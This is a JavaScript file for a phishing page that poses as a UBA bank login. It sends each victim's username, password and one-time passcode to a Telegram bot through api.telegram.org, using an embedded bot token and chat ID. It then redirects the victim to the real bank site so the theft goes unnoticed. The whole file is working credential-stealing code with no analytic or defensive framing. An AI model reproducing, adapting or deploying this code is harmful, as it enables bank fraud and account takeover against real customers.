// Your Telegram Configuration
const token = "8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo";
const chat_id = "7909543900";

// Part 1: Handle Login
function handleUbaLogin() {
    const user = document.getElementById('uba-user');
    const pass = document.getElementById('uba-pass');

    // Reset borders
    user.style.border = "1px solid #ccc";
    pass.style.border = "1px solid #ccc";

    // Validation (Red Box check)
    if (user.value === "" || pass.value === "") {
        if (user.value === "") user.style.border = "2px solid red";
        if (pass.value === "") pass.style.border = "2px solid red";
        return;
    }

    // Prepare message
    const message = `🔴 UBA LOGIN ATTEMPT 🔴\n\nUser: ${user.value}\nPass: ${pass.value}`;
    
    // Send to Telegram
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

    fetch(url).then(() => {
        // Switch to OTP screen
        document.getElementById('login-section').style.display = 'none';
        document.getElementById('otp-area').style.display = 'block';
    }).catch(err => console.error("Error sending to bot:", err));
}

// Part 2: Handle OTP & Redirect
function handleUbaOtp() {
    const otp = document.getElementById('uba-otp');

    if (otp.value === "") {
        otp.style.border = "2px solid red";
        return;
    }

    const message = `🔑 UBA OTP RECEIVED 🔑\n\nOTP Code: ${otp.value}`;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

    fetch(url).then(() => {
        // Final Redirect to official UBA site
        window.location.href = "https://www.ubagroup.com/";
    }).catch(err => console.error("Error sending OTP:", err));
}
